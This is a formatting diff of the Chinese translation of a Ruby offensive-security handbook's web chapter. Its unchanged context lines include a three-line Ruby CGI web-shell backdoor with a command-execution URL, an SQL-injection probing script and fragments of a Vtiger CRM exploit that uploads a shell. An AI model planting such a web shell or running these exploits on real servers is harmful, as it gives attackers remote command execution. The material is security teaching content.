@@ -135,9 +135,9 @@ puts response.body
 
 让我们将以下表单作为一个简单的 post 表单在我们的脚本中模拟
 
-| ![PostForm](webfu__post_form1.png) |
+| ![PostForm](img/webfu__post_form1.png) |
 | --- |
-| **图1.** 简单的 Post 表单 |
+| **图 1.** 简单的 Post 表单 |
 
 Post 表单代码：
 
@@ -168,7 +168,7 @@ Post 表单代码：
 </FORM> 
 ```
 
-我们需要发送一个 Post 请求，就像表单图1中的控制每个值和变量一样。
+我们需要发送一个 Post 请求，就像表单图 1 中的控制每个值和变量一样。
 
 ```
 require "net/http"
@@ -361,7 +361,7 @@ File.chmod(0200, file)  # To prevent public access to the log file
 puts "" 
 ```
 
-### Web Shell^([1](#fn_1)) - 通过 GET 执行命令
+### Web Shell^(1) - 通过 GET 执行命令
 
 如果你有一个支持 Ruby CGI 的服务器，你可以使用以下内容作为后门
 
@@ -373,7 +373,7 @@ puts cgi.header
 system(cgi['cmd']) 
 ```
 
-现在你可以简单地使用 web 浏览器、Netcat 或 WebShellConsole^([1](#fn_1))来执行你的命令。例如**浏览器**
+现在你可以简单地使用 web 浏览器、Netcat 或 WebShellConsole^(1)来执行你的命令。例如**浏览器**
 
 ```
 http://host/cgi/shell.rb?cmd=ls -la 
@@ -435,7 +435,7 @@ HTTP（The Gem！即 http.rb）是一个用于从 Ruby 发出请求的易于使�
 
 * * *
 
-> ¹. [WebShellConsole](https://github.com/KINGSABRI/WebShellConsole) 是一个简单的交互式控制台，使用 HTTP GET 与简单的 Web shell 进行交互，而不是使用浏览器。wsc 将使用任何使用 GET 方法的 shell。它还负责所有 URL 编码。[↩](#reffn_1 "跳回到文本中的脚注 [1]")
+> ¹. [WebShellConsole](https://github.com/KINGSABRI/WebShellConsole) 是一个简单的交互式控制台，使用 HTTP GET 与简单的 Web shell 进行交互，而不是使用浏览器。wsc 将使用任何使用 GET 方法的 shell。它还负责所有 URL 编码。↩
 
 +   [CGI 示例](http://www.java2s.com/Code/Ruby/CGI/CatalogCGI.htm)
 
@@ -445,7 +445,7 @@ HTTP（The Gem！即 http.rb）是一个用于从 Ruby 发出请求的易于使�
 
 ## 基本的 SQLi 脚本作为命令行浏览器
 
-这是一个非常基本的脚本，获取你提供的负载并将其发送到易受攻击的参数，然后将响应返回给你。我将使用([http://testphp.vulnweb.com/](http://testphp.vulnweb.com/))，因为它是合法的测试。
+这是一个非常基本的脚本，获取你提供的负载并将其发送到易受攻击的参数，然后将响应返回给你。我将使用([`testphp.vulnweb.com/`](http://testphp.vulnweb.com/))，因为它是合法的测试。
 
 ```
 #!/usr/bin/env ruby
@@ -542,7 +542,7 @@ response = Net::HTTP.get uri
 puts "[+] The #{URL.decode(uri.to_s)} is vulnerable!" unless response.match(/#{errors[:mysql][0]}/i).nil? 
 ```
 
-在这个 URL 上尝试一下 ([http://testasp.vulnweb.com/showforum.asp?id=0](http://testasp.vulnweb.com/showforum.asp?id=0))
+在这个 URL 上尝试一下 ([`testasp.vulnweb.com/showforum.asp?id=0`](http://testasp.vulnweb.com/showforum.asp?id=0))
 
 结果
 
@@ -842,11 +842,11 @@ Attackers.create(:name => 'LulzSec',      :ip => "192.168.0.14")
 Attackers.create(:name => 'Lizard Squad', :ip => "192.168.0.253") 
 ```
 
-您将注意到ActiveRecord会检查数据库表本身，以查找可用的列。这就是我们能够使用participant.name的访问器方法而无需显式定义它们的原因：我们在数据库中定义了它们，ActiveRecord就会识别它们。
+您将注意到 ActiveRecord 会检查数据库表本身，以查找可用的列。这就是我们能够使用 participant.name 的访问器方法而无需显式定义它们的原因：我们在数据库中定义了它们，ActiveRecord 就会识别它们。
 
 您可以找到该项
 
-+   按id
++   按 id
 
     ```
     Attackers.find(1) 
@@ -873,7 +873,7 @@ attacker.name
 attacker.ip 
 ```
 
-如果您想从数据库中删除一个项目，可以使用ActiveRecord::Base的destroy（删除数据库中的记录）方法：
+如果您想从数据库中删除一个项目，可以使用 ActiveRecord::Base 的 destroy（删除数据库中的记录）方法：
 
 ```
 Attackers.find(2).destroy 
@@ -916,11 +916,11 @@ attacker.ip
 Attackers.find(2).destroy 
 ```
 
-### Oracle数据库
+### Oracle 数据库
 
 +   先决条件
 
-为了使[ruby-oci8](http://www.rubydoc.info/gems/ruby-oci8/file/docs/install-full-client.md) -这是Oracle驱动程序的主要依赖项-正常工作，您需要执行一些额外的步骤：
+为了使[ruby-oci8](http://www.rubydoc.info/gems/ruby-oci8/file/docs/install-full-client.md) -这是 Oracle 驱动程序的主要依赖项-正常工作，您需要执行一些额外的步骤：
 
 +   [Linux](http://www.oracle.com/technetwork/topics/linuxx86-64soft-092277.html) | [Windows](http://www.oracle.com/technetwork/topics/winsoft-085727.html) | [Mac](http://www.oracle.com/technetwork/topics/intel-macsoft-096467.html)的下载链接
 
@@ -938,7 +938,7 @@ unzip -qq instantclient-sdk-linux.x64-12.1.0.2.0.zip
 unzip -qq instantclient-sqlplus-linux.x64-12.1.0.2.0.zip 
 ```
 
-+   以root / sudo身份创建系统目录
++   以 root / sudo 身份创建系统目录
 
 ```
 mkdir -p /usr/local/oracle/{network,product/instantclient_64/12.1.0.2.0/{bin,lib,jdbc/lib,rdbms/jlib,sqlplus/admin/}} 
@@ -984,7 +984,7 @@ cd -
 
 +   设置环境
 
-将Oracle环境变量追加到`~/.bashrc`中，然后添加以下内容：
+将 Oracle 环境变量追加到`~/.bashrc`中，然后添加以下内容：
 
 ```
 # Oracle Environment
@@ -1003,7 +1003,7 @@ export SQLPATH=$ORACLE_HOME/sqlplus/admin
 source ~/.bashrc 
 ```
 
-+   安装Oracle适配器gem
++   安装 Oracle 适配器 gem
 
     ```
     gem install ruby-oci8 activerecord-oracle_enhanced-adapter 
@@ -1025,9 +1025,9 @@ class DBAUsers < ActiveRecord::Base
 end 
 ```
 
-### MSSQL数据库
+### MSSQL 数据库
 
-+   安装MSSQL适配器gem
++   安装 MSSQL 适配器 gem
 
 ```
 gem install tiny_tds activerecord-sqlserver-adapter 
@@ -1035,21 +1035,21 @@ gem install tiny_tds activerecord-sqlserver-adapter
 
 * * *
 
-# 扩展Burp Suite
+# 扩展 Burp Suite
 
-# 扩展Burp Suite
+# 扩展 Burp Suite
 
-## 为Burp扩展设置Ruby环境
+## 为 Burp 扩展设置 Ruby 环境
 
-1.  从[JRuby Downloads](http://jruby.org/download)下载一个稳定版本的JRuby
+1.  从[JRuby Downloads](http://jruby.org/download)下载一个稳定版本的 JRuby
 
-1.  选择Linux（JRuby x.x.x Complete .jar）的jar包或Windows的可执行文件。
+1.  选择 Linux（JRuby x.x.x Complete .jar）的 jar 包或 Windows 的可执行文件。
 
 1.  从**Burp Suite** >> **Extender** >> **Options** >> **Ruby Environment**导入环境。
 
-![](webfu__burp_setenv1.png)
+![](img/webfu__burp_setenv1.png)
 
-导入Burp Suite Extender核心API `IBurpExtender`
+导入 Burp Suite Extender 核心 API `IBurpExtender`
 
 **alert.rb**
 
@@ -1067,25 +1067,25 @@ class BurpExtender
 end 
 ```
 
-加载插件alert.rb
+加载插件 alert.rb
 
-![](webfu__burp-ext1.png)
+![](img/webfu__burp-ext1.png)
 
 检查警报选项卡
 
-![](webfu__burp-ext2.png)
+![](img/webfu__burp-ext2.png)
 
-### Ruby模板倡议中的Burp Suite扩展
+### Ruby 模板倡议中的 Burp Suite 扩展
 
-随着Rubyfu项目的不断发展，我们决定开发我们自己的版本，为Ruby在信息安全社区中建立一个坚实的地位。我们决定建立一个仓库，使得用Ruby构建Burp Suite扩展变得非常简单和易懂。[**仓库链接**](https://github.com/KINGSABRI/BurpSuite_Extension_Ruby_Template)
+随着 Rubyfu 项目的不断发展，我们决定开发我们自己的版本，为 Ruby 在信息安全社区中建立一个坚实的地位。我们决定建立一个仓库，使得用 Ruby 构建 Burp Suite 扩展变得非常简单和易懂。[**仓库链接**](https://github.com/KINGSABRI/BurpSuite_Extension_Ruby_Template)
 
 ## Buby
 
-Buby是JRuby与流行的商业网络安全测试工具Burp Suite的混合。Burp是通过使用BurpExtender API的Java扩展从JRuby派生并与之绑定的。该扩展旨在向Burp Suite添加Ruby脚本功能，其接口可与Burp的纯Java扩展接口相媲美。
+Buby 是 JRuby 与流行的商业网络安全测试工具 Burp Suite 的混合。Burp 是通过使用 BurpExtender API 的 Java 扩展从 JRuby 派生并与之绑定的。该扩展旨在向 Burp Suite 添加 Ruby 脚本功能，其接口可与 Burp 的纯 Java 扩展接口相媲美。
 
 **资源**
 
-+   Burp Suite Extender API文档 [ [链接](https://portswigger.net/burp/extender/api/) ]
++   Burp Suite Extender API 文档 [ [链接](https://portswigger.net/burp/extender/api/) ]
 
 +   逐步指导使用 Ruby 编写的 Burp 扩展，用于 JSON 加密/解密 [ [Part 1](https://www.trustwave.com/Resources/SpiderLabs-Blog/JSON-Crypto-Helper-a-Ruby-based-Burp-Extension-for-JSON-Encryption/Decryption---Part-I/) | [Part 2](http://blog.spiderlabs.com/2015/01/json-crypto-helper-a-ruby-based-burp-extension-for-json-encryptiondecryption-part-ii.html) ]
 
@@ -1555,27 +1555,27 @@ Web 服务（也称为 Web 服务）由 W3C 定义为“设计用于支持网络
 
 1.  Web 服务是 API（应用程序编程接口）的一种形式。
 
-1.  API被计算机程序员用来建立软件应用程序之间的链接。这种接口可以采用多种形式，Web服务只是其中之一。
+1.  API 被计算机程序员用来建立软件应用程序之间的链接。这种接口可以采用多种形式，Web 服务只是其中之一。
 
-1.  有几种类型的Web服务。SOAP（简单对象访问协议）是最常见的之一。API采用服务描述（WSDL）的形式，用于自动生成建立连接的程序代码。
+1.  有几种类型的 Web 服务。SOAP（简单对象访问协议）是最常见的之一。API 采用服务描述（WSDL）的形式，用于自动生成建立连接的程序代码。
 
 * * *
 
-+   [API和Web服务之间的区别](http://microsoft-techies.blogspot.com/2014/03/difference-between-api-and-web-service.html)
++   [API 和 Web 服务之间的区别](http://microsoft-techies.blogspot.com/2014/03/difference-between-api-and-web-service.html)
 
 +   [应用程序编程接口](https://en.wikipedia.org/wiki/Application_programming_interface)
 
-+   [Web服务](https://en.wikipedia.org/wiki/Web_service)
++   [Web 服务](https://en.wikipedia.org/wiki/Web_service)
 
-# 与Web服务交互
+# 与 Web 服务交互
 
-# 与Web服务交互
+# 与 Web 服务交互
 
 ### SOAP - WSDL
 
-一般来说，处理SOAP意味着处理XML消息和描述如何使用给定SOAP API的WSDL文件（也是XML）。Ruby有一种非常优雅的方式来做到这一点，让我们用一个漏洞来动手实践一下
+一般来说，处理 SOAP 意味着处理 XML 消息和描述如何使用给定 SOAP API 的 WSDL 文件（也是 XML）。Ruby 有一种非常优雅的方式来做到这一点，让我们用一个漏洞来动手实践一下
 
-+   安装wasabi、sabvon和httpclient宝石
++   安装 wasabi、sabvon 和 httpclient 宝石
 
     ```
     gem install wasabi savon httpclient 
@@ -1678,9 +1678,9 @@ response[:conversion_rate_response][:conversion_rate_result]
 1.4415 
 ```
 
-#### 通过SOAP漏洞进行黑客攻击
+#### 通过 SOAP 漏洞进行黑客攻击
 
-这是一个针对Vtiger CRM SOAP的工作利用，从绕过认证到上传shell
+这是一个针对 Vtiger CRM SOAP 的工作利用，从绕过认证到上传 shell
 
 ```
 #!/usr/bin/env ruby
@@ -1724,11 +1724,11 @@ puts "[+] PHP Shell on:  http://#{URI.parse(url).host}/vtigercrm/soap/#{shell_na
 
 * * *
 
-# 与API交互
+# 与 API 交互
 
-# 与API交互
+# 与 API 交互
 
-API有各种结构与其同行进行交互。
+API 有各种结构与其同行进行交互。
 
 **StackExchange API**
 
@@ -1750,13 +1750,13 @@ JSON.parse(open('https://api.ipify.org?format=json').read)["ip"]
 
 # WordPress API
 
-Ruby有一个名为`xmlrpc`的[标准库](http://ruby-doc.org/stdlib-2.2.3/libdoc/xmlrpc/rdoc/XMLRPC/Client.html)，它负责处理所有xmlrpc的事情，甚至可以使用它创建一个XML-RPC服务器。让我们来看一个真实的例子
+Ruby 有一个名为`xmlrpc`的[标准库](http://ruby-doc.org/stdlib-2.2.3/libdoc/xmlrpc/rdoc/XMLRPC/Client.html)，它负责处理所有 xmlrpc 的事情，甚至可以使用它创建一个 XML-RPC 服务器。让我们来看一个真实的例子
 
-寻找真正知名支持XML-RPC的应用程序，当然WordPress是第一个参与者。
+寻找真正知名支持 XML-RPC 的应用程序，当然 WordPress 是第一个参与者。
 
 那么我们想要做什么呢？
 
-+   与WordPress打个招呼
++   与 WordPress 打个招呼
 
 +   列出所有可用方法
 
@@ -2035,9 +2035,9 @@ response =  server.call('wp.getComments', 0, opts[:user], opts[:password], {"pos
   "custom_fields"=>[]}] 
 ```
 
-这是新的帖子！![](webfu__xmlrpc1.png)
+这是新的帖子！![](img/webfu__xmlrpc1.png)
 
-来源：[如何使用Ruby通过XML-RPC编程控制WordPress](http://notes.jerzygangi.com/how-to-programatically-control-wordpress-with-ruby-using-xml-rpc/)
+来源：[如何使用 Ruby 通过 XML-RPC 编程控制 WordPress](http://notes.jerzygangi.com/how-to-programatically-control-wordpress-with-ruby-using-xml-rpc/)
 
 更多关于[WordPress XML-RPC](http://notes.jerzygangi.com/how-to-programatically-control-wordpress-with-ruby-using-xml-rpc/)的内容
 
@@ -2047,9 +2047,9 @@ response =  server.call('wp.getComments', 0, opts[:user], opts[:password], {"pos
 
 # Twitter API
 
-处理Twitter的API对于信息收集、分类和社会工程非常有用。然而，您必须拥有一些密钥和令牌才能与Twitter的API进行交互。要做到这一点，请参考官方的[Twitter开发页面](https://dev.twitter.com/oauth/overview)。
+处理 Twitter 的 API 对于信息收集、分类和社会工程非常有用。然而，您必须拥有一些密钥和令牌才能与 Twitter 的 API 进行交互。要做到这一点，请参考官方的[Twitter 开发页面](https://dev.twitter.com/oauth/overview)。
 
-+   安装Twitter API宝石
++   安装 Twitter API 宝石
 
     ```
     gem install twitter 
@@ -2082,9 +2082,9 @@ puts client.status(649235138585366528)       # Fetch a particular Tweet by ID
 puts client.create_direct_message("Rubyfu", "Hi, I'm KINGSABRI")    # Send direct message to a particular user 
 ```
 
-![](webfu__twitterAPI1.png)
+![](img/webfu__twitterAPI1.png)
 
-**轮到你了**，使用上面的例子向@Rubyfu发推文。将您的代码和输出推文给**@Rubyfu**。
+**轮到你了**，使用上面的例子向@Rubyfu 发推文。将您的代码和输出推文给**@Rubyfu**。
 
 ## 构建被盗凭证通知机器人
 
@@ -2159,7 +2159,7 @@ end
 
 运行后，打开你的 Telegram 并找到机器人，开始聊天输入 `/start`，尝试发送 `/rubyfu`。
 
-![](rubyfubot.png)
+![](img/rubyfubot.png)
 
 +   内联机器人
 
@@ -2415,13 +2415,13 @@ ruby webrick-server.rb 8080
 
 **参考资料**
 
-+   [http://ruby-doc.org/stdlib-2.0.0/libdoc/webrick/rdoc/WEBrick.html](http://ruby-doc.org/stdlib-2.0.0/libdoc/webrick/rdoc/WEBrick.html)
++   [`ruby-doc.org/stdlib-2.0.0/libdoc/webrick/rdoc/WEBrick.html`](http://ruby-doc.org/stdlib-2.0.0/libdoc/webrick/rdoc/WEBrick.html)
 
-+   [https://www.igvita.com/2007/02/13/building-dynamic-webrick-servers-in-ruby/](https://www.igvita.com/2007/02/13/building-dynamic-webrick-servers-in-ruby/)
++   [`www.igvita.com/2007/02/13/building-dynamic-webrick-servers-in-ruby/`](https://www.igvita.com/2007/02/13/building-dynamic-webrick-servers-in-ruby/)
 
-+   [https://rubyit.wordpress.com/2011/07/25/basic-rest-server-with-webrick/](https://rubyit.wordpress.com/2011/07/25/basic-rest-server-with-webrick/)
++   [`rubyit.wordpress.com/2011/07/25/basic-rest-server-with-webrick/`](https://rubyit.wordpress.com/2011/07/25/basic-rest-server-with-webrick/)
 
-+   [https://gist.github.com/Integralist/2862917](https://gist.github.com/Integralist/2862917)
++   [`gist.github.com/Integralist/2862917`](https://gist.github.com/Integralist/2862917)
 
 ## Web 代理
 
@@ -2513,4 +2513,4 @@ proxy.start
 
 如果您操作正确，您将在浏览器中看到一个身份验证弹出窗口，就像下面这样。
 
-![](webfu__proxy2.png)
+![](img/webfu__proxy2.png)
